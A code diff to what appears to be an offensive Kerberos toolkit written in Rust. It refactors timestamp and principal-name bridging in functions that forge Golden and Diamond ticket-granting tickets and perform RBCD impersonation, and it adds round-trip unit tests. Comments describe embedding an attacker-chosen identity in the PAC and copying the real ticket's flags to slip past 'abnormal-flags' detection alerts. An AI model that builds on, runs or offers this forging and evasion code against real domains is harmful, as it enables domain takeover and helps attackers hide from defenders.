@@ -28,7 +28,9 @@ use picky_krb::constants::types::{
     AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_ENC_TIMESTAMP_KEY_USAGE,
 };
 use picky_krb::crypto::{Cipher, CipherSuite};
-use picky_krb::data_types::{EncryptedData, PaData, PaEncTsEnc, PrincipalName, Ticket};
+use picky_krb::data_types::{
+    EncryptedData, KerberosTime, PaData, PaEncTsEnc, PrincipalName, Ticket,
+};
 use picky_krb::messages::{AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, KrbError};
 
 /// Ticket-Granting Ticket plus the material needed to use it.
@@ -257,6 +259,53 @@ fn kc_service_key_of(st: &ServiceTicket) -> Result<kerbcore::KerberosKey> {
 fn kc_cname_of(tgt: &Tgt) -> Result<kerbcore::types::PrincipalName> {
     kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(&tgt.cname)?)
         .map_err(|e| anyhow!("bridge picky->kerbcore cname: {e:?}"))
+}
+
+/// Bridge a standalone picky `PrincipalName` → kerbcore `PrincipalName`. Used by the
+/// `TicketTimestamps` boundary shim (`cname_template`) so the exported struct keeps its
+/// v1.5.2 picky-typed public shape while forge internals stay on kerbcore. Deleted at K9.
+fn kc_cname(pn: &PrincipalName) -> Result<kerbcore::types::PrincipalName> {
+    kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(pn)?)
+        .map_err(|e| anyhow!("bridge picky->kerbcore PrincipalName: {e:?}"))
+}
+
+/// Bridge a kerbcore Kerberos GeneralizedTime string ("YYYYMMDDHHMMSSZ") → picky
+/// `KerberosTime`. Keeps the v1.5.2 `TicketTimestamps` public field types intact through
+/// the kerbcore-Phase-1 migration; K9 removes this along with the picky types themselves.
+fn picky_krb_time(s: &str) -> Result<KerberosTime> {
+    let b = s.as_bytes();
+    if b.len() != 15 || b[14] != b'Z' {
+        bail!("bad kerberos generalized-time (want YYYYMMDDHHMMSSZ): {s:?}");
+    }
+    let n = |slice: &[u8]| -> Result<u16> {
+        std::str::from_utf8(slice)?
+            .parse::<u16>()
+            .map_err(|e| anyhow!("kerb-time field {slice:?} of {s:?}: {e}"))
+    };
+    let date = picky_asn1::date::Date::new(
+        n(&b[0..4])?,
+        n(&b[4..6])? as u8,
+        n(&b[6..8])? as u8,
+        n(&b[8..10])? as u8,
+        n(&b[10..12])? as u8,
+        n(&b[12..14])? as u8,
+    )
+    .ok_or_else(|| anyhow!("invalid kerberos time components: {s:?}"))?;
+    Ok(KerberosTime::from(date))
+}
+
+/// Reverse of [`picky_krb_time`]. Deleted at K9.
+fn kc_krb_time_str(t: &KerberosTime) -> String {
+    let d = &t.0;
+    format!(
+        "{:04}{:02}{:02}{:02}{:02}{:02}Z",
+        d.year(),
+        d.month(),
+        d.day(),
+        d.hour(),
+        d.minute(),
+        d.second()
+    )
 }
 
 /// Hand-assemble a TGS-REQ (kerbcore `messages`) with arbitrary padata, an optional additional
@@ -752,11 +801,19 @@ pub struct ServiceTicket {
     pub session_key: Vec<u8>,
     /// The service-ticket session key's Kerberos enctype (RFC 3961 number), tracked from the
     /// TGS-REP reply key type. 1.5.3 audit H-1 — replaces the length-heuristic that misidentified
-    /// AES128 (16-byte) session keys as RC4.
-    pub session_etype: i32,
+    /// AES128 (16-byte) session keys as RC4. Kept private (getter: [`Self::session_etype`]) so
+    /// adding it to `ServiceTicket` mid-1.5.x is additive under strict struct-literal semver.
+    session_etype: i32,
     pub crealm: String,
     pub cname: PrincipalName,
     pub spn: Vec<String>,
+}
+
+impl ServiceTicket {
+    /// The service-ticket session key's Kerberos enctype (RFC 3961 number).
+    pub fn session_etype(&self) -> i32 {
+        self.session_etype
+    }
 }
 
 impl std::fmt::Debug for ServiceTicket {
@@ -1194,11 +1251,13 @@ async fn rbcd_impersonate_with_tgt(
 /// forged one's clock-domain matches the KDC exactly.
 #[derive(Default, Clone)]
 pub struct TicketTimestamps {
-    /// Kerberos generalized-time string (`YYYYMMDDHHMMSSZ`), or `None` for the now/far-future default.
-    pub auth_time: Option<String>,
-    pub starttime: Option<String>,
-    pub endtime: Option<String>,
-    pub renew_till: Option<String>,
+    /// v1.5.2 public type preserved through the kerbcore Phase-1 migration — the internal
+    /// forger converts to/from kerbcore's `String`-typed GeneralizedTime at the boundary
+    /// (see `picky_krb_time` / `kc_krb_time_str`). K9 flips the public shape.
+    pub auth_time: Option<KerberosTime>,
+    pub starttime: Option<KerberosTime>,
+    pub endtime: Option<KerberosTime>,
+    pub renew_till: Option<KerberosTime>,
     /// 32-bit `TicketFlags` value to embed. `None` = the Golden default `0x40e10000`
     /// (FORWARDABLE | RENEWABLE | INITIAL | PRE-AUTHENT | OK-AS-DELEGATE).
     /// 1.5.3 audit H-3 — Diamond must inherit the real ticket's flags so the outer word matches
@@ -1211,8 +1270,10 @@ pub struct TicketTimestamps {
     /// `EncTicketPart.cname` and the returned `Tgt.cname` are set to `pn`
     /// while the PAC still carries the attacker-chosen identity from
     /// `id.user`. When `None`, everything falls back to `id.user` (Golden
-    /// ticket behaviour where cname and PAC identity match). 1.5.3: kerbcore type.
-    pub cname_template: Option<kerbcore::types::PrincipalName>,
+    /// ticket behaviour where cname and PAC identity match). 1.5.3: kept
+    /// on picky here so the exported struct type is unchanged; forge internals
+    /// bridge to kerbcore via `kc_cname`.
+    pub cname_template: Option<PrincipalName>,
 }
 
 /// Shared ticket forger. Marshals the PAC (signed with `server_sig_key`/`kdc_sig_key`), wraps it
@@ -1285,23 +1346,38 @@ fn forge_ticket_with_timestamps(
     // Session key: 16 bytes for RC4 (etype 23), 32 for AES256 (etype 18).
     let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
     rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
-    // Outer cname (kerbcore): Diamond inherits from the template TGT (`ts.cname_template`);
-    // Golden uses the attacker-chosen identity (`id.user`). Whatever's here MUST also land on
-    // `Tgt.cname` below (bridged to picky), or the AP-REQ authenticator mismatches the ticket.
-    let cname_kc = ts
-        .cname_template
-        .clone()
-        .unwrap_or_else(|| kerbcore::types::PrincipalName {
+    // Outer cname: Diamond inherits from the template TGT (`ts.cname_template`, picky-typed
+    // through 1.5.x); Golden uses the attacker-chosen identity (`id.user`). Whatever's here
+    // MUST also land on `Tgt.cname` below (bridged to picky), or the AP-REQ authenticator
+    // mismatches the ticket. 1.5.3 boundary: bridge picky → kerbcore here.
+    let cname_kc = match ts.cname_template.as_ref() {
+        Some(pn) => kc_cname(pn)?,
+        None => kerbcore::types::PrincipalName {
             name_type: kerbcore::client::NT_PRINCIPAL,
             name_string: vec![id.user.clone()],
-        });
+        },
+    };
 
-    let auth_time = ts.auth_time.clone().unwrap_or_else(now_krb_str);
-    let starttime = ts.starttime.clone().unwrap_or_else(now_krb_str);
-    let endtime = ts.endtime.clone().unwrap_or_else(|| FAR_FUTURE.to_string());
+    // 1.5.3 boundary: bridge picky KerberosTime → kerbcore GeneralizedTime string.
+    let auth_time = ts
+        .auth_time
+        .as_ref()
+        .map(kc_krb_time_str)
+        .unwrap_or_else(now_krb_str);
+    let starttime = ts
+        .starttime
+        .as_ref()
+        .map(kc_krb_time_str)
+        .unwrap_or_else(now_krb_str);
+    let endtime = ts
+        .endtime
+        .as_ref()
+        .map(kc_krb_time_str)
+        .unwrap_or_else(|| FAR_FUTURE.to_string());
     let renew_till = ts
         .renew_till
-        .clone()
+        .as_ref()
+        .map(kc_krb_time_str)
         .unwrap_or_else(|| FAR_FUTURE.to_string());
     let kt = |s: &str| kerbcore::types::KerberosTime(s.to_string()).encode();
 
@@ -1421,11 +1497,12 @@ pub fn forge_diamond_tgt(
 ) -> Result<Tgt> {
     let (etp, _pac_bytes) = crate::pac::decrypt_ticket_pac(real, krbtgt_key)
         .context("decrypt real TGT ticket with krbtgt key")?;
+    // 1.5.3 boundary: kerbcore etp → picky-typed public `TicketTimestamps`.
     let ts = TicketTimestamps {
-        auth_time: Some(etp.authtime.clone()),
-        starttime: etp.starttime.clone(),
-        endtime: Some(etp.endtime.clone()),
-        renew_till: etp.renew_till.clone(),
+        auth_time: Some(picky_krb_time(&etp.authtime)?),
+        starttime: etp.starttime.as_deref().map(picky_krb_time).transpose()?,
+        endtime: Some(picky_krb_time(&etp.endtime)?),
+        renew_till: etp.renew_till.as_deref().map(picky_krb_time).transpose()?,
         // 1.5.3 audit H-3: inherit the real ticket's `TicketFlags` — the outer flag word is
         // exactly the detection discriminator "abnormal-flags-for-this-user" alerts hook.
         // Without this, Diamond overrode with the Golden default 0x40e10000, defeating the
@@ -1438,7 +1515,7 @@ pub fn forge_diamond_tgt(
         // header-vs-ticket cname get BADMATCH. Real Diamond ticket = outer
         // cname is the template's (looks like a normal login for that user),
         // PAC internally carries the attacker's group memberships.
-        cname_template: Some(etp.cname.clone()),
+        cname_template: Some(picky_cname(&etp.cname)?),
     };
     let realm_up = real.crealm.to_uppercase();
     forge_ticket_with_timestamps(
@@ -1680,5 +1757,94 @@ mod aes_key_tests {
         assert_eq!(k, derive(b"password", b"CORP.LOCALalice")); // deterministic
         assert_ne!(k, derive(b"password", b"CORP.LOCALbob")); // salt-sensitive
         assert_ne!(k, derive(b"different", b"CORP.LOCALalice")); // password-sensitive
+    }
+}
+
+/// Round-trip tests for the 1.5.3 kerbcore-Phase-1 boundary shims that keep
+/// `TicketTimestamps` publicly picky-typed while the forger internals run on kerbcore
+/// (see `picky_krb_time`, `kc_krb_time_str`, `kc_cname`). Deleted at K9 with the shims.
+#[cfg(test)]
+mod picky_bridge_tests {
+    use super::*;
+
+    #[test]
+    fn krb_time_far_future_round_trip() {
+        // The forger uses this exact constant for ticket endtime / renew_till defaults.
+        let s = FAR_FUTURE;
+        let pt = picky_krb_time(s).expect("FAR_FUTURE parses");
+        assert_eq!(
+            kc_krb_time_str(&pt),
+            s,
+            "FAR_FUTURE must round-trip byte-identical"
+        );
+    }
+
+    #[test]
+    fn krb_time_kdc_shape_round_trip() {
+        // A KDC-shaped generalized time: 2026-09-28 14:32:11 UTC.
+        let s = "20260928143211Z";
+        let pt = picky_krb_time(s).unwrap();
+        assert_eq!(kc_krb_time_str(&pt), s);
+        // Component check to prove parse is right, not just symmetric.
+        assert_eq!(pt.0.year(), 2026);
+        assert_eq!(pt.0.month(), 9);
+        assert_eq!(pt.0.day(), 28);
+        assert_eq!(pt.0.hour(), 14);
+        assert_eq!(pt.0.minute(), 32);
+        assert_eq!(pt.0.second(), 11);
+    }
+
+    #[test]
+    fn krb_time_now_shape_round_trip() {
+        // The forger also derives `auth_time` from `now_krb_str()`, so its actual
+        // wire format has to be the one `picky_krb_time` accepts.
+        let s = now_krb_str();
+        let pt = picky_krb_time(&s).expect("now_krb_str must be parseable");
+        assert_eq!(kc_krb_time_str(&pt), s);
+    }
+
+    #[test]
+    fn krb_time_rejects_malformed() {
+        // Frame/format validation. Calendar-plausibility validation is left to picky_asn1's
+        // `Date::new`, which turns out to be lax (accepts Feb 30) — not exercised here.
+        // kerbcore never emits calendar-invalid dates when parsing a KDC DER response, so a
+        // stricter shim would over-fit; frame-shape correctness is what matters at the boundary.
+        assert!(picky_krb_time("").is_err(), "empty");
+        assert!(picky_krb_time("20260928143211").is_err(), "missing Z");
+        assert!(picky_krb_time("20260928143211z").is_err(), "lowercase z");
+        assert!(picky_krb_time("20260928143211ZZ").is_err(), "too long");
+        assert!(picky_krb_time("2026092814321Z").is_err(), "too short by 1");
+        assert!(
+            picky_krb_time("2026XX28143211Z").is_err(),
+            "non-digit month"
+        );
+    }
+
+    #[test]
+    fn cname_bridge_round_trip_srv_inst() {
+        // Two-component SRV_INST (`cifs/host.corp.local`) — the shape S4U / RBCD chain
+        // funnels through the shim on the READ side (`forge_ticket_with_timestamps`).
+        let kc = kerbcore::types::PrincipalName {
+            name_type: kerbcore::client::NT_SRV_INST,
+            name_string: vec!["cifs".to_string(), "host.corp.local".to_string()],
+        };
+        let picky = picky_cname(&kc).expect("kerbcore -> picky");
+        let back = kc_cname(&picky).expect("picky -> kerbcore");
+        assert_eq!(back.name_type, kc.name_type);
+        assert_eq!(back.name_string, kc.name_string);
+        // Byte-identical DER: the strongest correctness signal.
+        assert_eq!(back.encode(), kc.encode(), "byte-identical DER round-trip");
+    }
+
+    #[test]
+    fn cname_bridge_round_trip_principal() {
+        // Single-component NT_PRINCIPAL (`Administrator`) — the Golden/Silver default.
+        let kc = kerbcore::types::PrincipalName {
+            name_type: kerbcore::client::NT_PRINCIPAL,
+            name_string: vec!["Administrator".to_string()],
+        };
+        let picky = picky_cname(&kc).unwrap();
+        let back = kc_cname(&picky).unwrap();
+        assert_eq!(back.encode(), kc.encode());
     }
 }
